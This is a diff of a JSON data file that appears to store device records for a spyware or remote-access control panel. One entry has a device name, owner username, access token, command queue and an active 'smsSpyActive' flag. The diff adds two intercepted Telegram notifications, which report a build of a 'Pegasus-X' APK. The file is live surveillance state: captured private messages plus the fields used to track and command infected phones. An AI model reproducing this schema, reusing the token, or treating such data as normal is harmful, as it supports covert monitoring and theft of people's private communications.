@@ -1652,7 +1652,7 @@
     "deviceName": "TECNO LE7",
     "ownerUsername": "Zal7Sex",
     "token": "62ec192e8707094a77af5015cee3227b",
-    "lastSeen": 1776541540286,
+    "lastSeen": 1776541564385,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-18T18:37:29.429Z",
@@ -1668,6 +1668,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "Pegasus-X Tool",
+        "content": "⚙️ Actions Running\n\n▢ Information\n└──\n ├── workflow : Build Pegasus-X\n ├── repo     : r-up10\n ├── branch   : main\n ├── commit   : be5e758\n └── status   : Running\n\n▢ Steps\n✅ Set up job\n✅ Checkout Repository\n✅ Setup Java\n🔄 Setup Flutter\n⏳ Create Missing Asset Dirs\n⏳ Generate App Icon\n⏳ Get Flutter Dependencies\n⏳ Build APK Release\n⏳ Build Universal APK\n⏳ Rename APK\n⏳ Upload APK Artifact\n⏳ Post Setup Flutter\n⏳ Post Setup Java\n⏳ Post Checkout Repository",
+        "time": "19/04 02:46",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776541564503
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Pegasus-X Tool",
+        "content": "⚙️ Actions Running\n\n▢ Information\n└──\n ├── workflow : Build Pegasus-X\n ├── repo     : r-up10\n ├── branch   : main\n ├── commit   : be5e758\n └── status   : Running\n\n⏳ Memuat langkah build...",
+        "time": "19/04 02:46",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776541564194
+      },
       {
         "appName": "Telegram",
         "sender": "Pegasus-X Tool",
